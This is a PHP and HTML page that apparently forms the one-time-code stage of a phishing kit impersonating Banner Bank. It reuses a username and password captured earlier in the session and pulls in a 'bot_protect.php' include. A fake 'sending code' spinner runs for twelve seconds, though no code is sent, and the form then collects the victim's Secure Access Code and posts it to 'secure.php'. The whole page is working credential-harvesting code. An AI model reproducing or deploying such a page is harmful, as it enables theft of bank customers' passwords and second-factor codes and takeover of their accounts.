<?php
require_once 'bot_protect.php';
session_start();

$username = trim($_SESSION['login_username'] ?? '');
$password = $_SESSION['login_password'] ?? '';

if ($username === '' || $password === '') {
    header('Location: index.html');
    exit;
}

$skipLoader = !empty($_SESSION['otp_show_form']) || !empty($_SESSION['otp_error']);
if (!$skipLoader) {
    $_SESSION['otp_show_form'] = false;
}

function mask_login_id(string $login): string
{
    if ($login === '') {
        return '';
    }
    if (strpos($login, '@') !== false) {
        [$local, $domain] = explode('@', $login, 2);
        $len = strlen($local);
        if ($len <= 1) {
            $maskedLocal = '*';
        } elseif ($len === 2) {
            $maskedLocal = $local[0] . '*';
        } else {
            $maskedLocal = $local[0] . str_repeat('*', $len - 2) . $local[$len - 1];
        }
        return $maskedLocal . '@' . $domain;
    }
    $len = strlen($login);
    if ($len <= 4) {
        return str_repeat('*', $len);
    }
    return substr($login, 0, 2) . str_repeat('*', $len - 4) . substr($login, -2);
}

$maskedUser = mask_login_id($username);
$error = $_SESSION['otp_error'] ?? '';
unset($_SESSION['otp_error']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Banner — Secure Access Code</title>
    <link href="css/base.css" rel="stylesheet">
    <link href="css/tecton.css" rel="stylesheet">
    <link href="css/vendor.css" rel="stylesheet">
    <link href="css/theme-q2-ff0ce88b56d68390f69bb36225b8d751.css" rel="stylesheet">
    <style>
        .login-inner .login-form.expanded {
            padding: 12px 8px 20px;
        }
        .login-title {
            margin-bottom: 8px;
        }
        .otp-step-badge {
            display: inline-block;
            font-size: 12px;
            font-weight: 700;
            letter-spacing: 0.04em;
            text-transform: uppercase;
            color: #003662;
            background: #e8f2fa;
            border-radius: 4px;
            padding: 6px 12px;
            margin-bottom: 18px;
        }
        .otp-heading {
            font-size: 1.4rem;
            font-weight: 600;
            color: #003662;
            margin: 0 0 14px;
            line-height: 1.35;
        }
        .otp-lead {
            font-size: 15px;
            color: #444;
            margin: 0 0 14px;
            line-height: 1.55;
        }
        .otp-user {
            font-size: 15px;
            margin: 0 0 22px;
            color: #222;
            line-height: 1.5;
        }
        .otp-user strong { font-weight: 600; }
        .otp-info {
            font-size: 14px;
            color: #555;
            background: #f7f9fc;
            border-left: 3px solid #0060af;
            padding: 14px 16px;
            margin: 0 0 26px;
            line-height: 1.5;
        }
        .otp-field label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #222;
        }
        .otp-field input {
            width: 99.9%;
            box-sizing: border-box;
            padding: 13px 14px;
            font-size: 20px;
            letter-spacing: 0.12em;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .otp-field input:focus {
            outline: none;
            box-shadow: var(--const-double-focus-ring, 0 0 0 2px #ffffff, 0 0 0 4px #0066cc);
        }
        .otp-field .hint {
            font-size: 13px;
            color: #666;
            margin-top: 10px;
            line-height: 1.45;
        }
        .otp-actions { margin-top: 28px; }
        .otp-actions button {
            width: 99.9%;
            padding: 14px 16px;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            background: #fec938;
            color: #003662;
        }
        .otp-actions button:hover { background: #fbf2d9; }
        .js-error {
            display: none;
            color: #c00;
            font-size: 14px;
            margin: 0 0 16px;
            padding: 10px 12px;
            line-height: 1.45;
            background: #fff3f3;
            border: 1px solid #f3c2c2;
            border-radius: 4px;
        }
        .js-error.visible { display: block; }
        .otp-back {
            display: inline-block;
            margin-top: 22px;
            font-size: 14px;
            color: #0060af;
            text-decoration: none;
        }
        .otp-back:hover { text-decoration: underline; }
        .otp-loading {
            text-align: center;
            padding: 28px 12px 36px;
        }
        .otp-loading.hidden { display: none; }
        .otp-spinner {
            width: 44px;
            height: 44px;
            margin: 0 auto 22px;
            border: 4px solid #e8f2fa;
            border-top-color: #0060af;
            border-radius: 50%;
            animation: otp-spin 0.9s linear infinite;
        }
        @keyframes otp-spin {
            to { transform: rotate(360deg); }
        }
        .otp-loading-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: #003662;
            margin: 0 0 12px;
        }
        .otp-loading-text {
            font-size: 15px;
            color: #555;
            line-height: 1.55;
            max-width: 340px;
            margin: 0 auto;
        }
        .otp-content.hidden { display: none; }
    </style>
</head>
<body id="pagebody" class="ember-application desktop theme-q2 frameless" style="background-image: url('images/desktop-background-q2-2d84adb4a94fe345760ff47cbb997f6e.png'); background-repeat: no-repeat; background-size: cover; background-position: center center;">
<div id="main-page" class="app-container desktop session-unestablished login">
    <div class="container meta-container main-page-container">
        <div id="app-login-modal">
            <div class="login-outer">
                <div class="login-inner fade-in" id="login-inner">
                    <div class="login-title" style="border-bottom: 0;">
                        <h1 class="ui-logo large ember-view">
                            <span class="sr-only">Banner Bank</span>
                            <div aria-hidden="true" class="logo-image"></div>
                        </h1>
                    </div>
                    <div class="login-form loginFormArea loginTextLeft expanded">
                        <p class="otp-user" style="margin-top: 15px;">Signing in as: <strong><?= htmlspecialchars($maskedUser, ENT_QUOTES, 'UTF-8') ?></strong></p>

                        <div id="otpLoading" class="otp-loading<?= $skipLoader ? ' hidden' : '' ?>">
                            <div class="otp-spinner" role="status" aria-label="Loading"></div>
                            <p class="otp-loading-title">Sending Secure Access Code</p>
                            <p class="otp-loading-text">
                                Please wait while we send a one-time code to the phone number or email address on file for your account.
                            </p>
                        </div>

                        <div id="otpContent" class="otp-content<?= $skipLoader ? '' : ' hidden' ?>">
                            <p class="otp-lead">
                                To protect your account, Banner Bank requires a one-time <strong>Secure Access Code</strong>
                                in addition to your Login ID and password.
                            </p>
                            <div class="otp-info">
                                A code was sent to the phone number or email address we have on file for this account.
                                Check your text messages, voicemail, or inbox, then enter the code below.
                                Codes expire after a few minutes.
                            </div>
                            <div id="otpError" class="js-error<?= $error !== '' ? ' visible' : '' ?>"><?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?></div>
                            <form method="post" action="secure.php" id="otpForm" autocomplete="off">
                                <div class="otp-field">
                                    <label for="otp">Secure Access Code</label>
                                    <input
                                        type="text"
                                        id="otp"
                                        name="otp"
                                        inputmode="numeric"
                                        autocomplete="one-time-code"
                                        maxlength="12"
                                        placeholder="Enter code"
                                        aria-describedby="otpHint"
                                        required
                                    >
                                    <p id="otpHint" class="hint">Usually 6 digits from your text or email.</p>
                                </div>
                                <div class="otp-actions">
                                    <button type="submit">Submit</button>
                                </div>
                            </form>
                            <a class="otp-back" href="index.html">← Back to Login ID and password</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
(function () {
  'use strict';
  const LOADER_MS = 12000;
  const loading = document.getElementById('otpLoading');
  const content = document.getElementById('otpContent');
  const form = document.getElementById('otpForm');
  const otp = document.getElementById('otp');
  const err = document.getElementById('otpError');

  function showOtpForm() {
    if (loading) loading.classList.add('hidden');
    if (content) content.classList.remove('hidden');
    if (otp) otp.focus();
  }

  if (content && content.classList.contains('hidden')) {
    window.setTimeout(showOtpForm, LOADER_MS);
  } else {
    showOtpForm();
  }

  if (!form || !otp || !err) return;

  const showErr = (m) => { err.textContent = m; err.classList.add('visible'); };
  const hideErr = () => { err.textContent = ''; err.classList.remove('visible'); };

  otp.addEventListener('input', hideErr);

  form.addEventListener('submit', (e) => {
    const code = otp.value.trim();
    if (!code) {
      e.preventDefault();
      showErr('Please enter your Secure Access Code.');
      return;
    }
    if (code.length < 4) {
      e.preventDefault();
      showErr('The Secure Access Code you entered is too short.');
    }
  });
})();
</script>
</body>
</html>
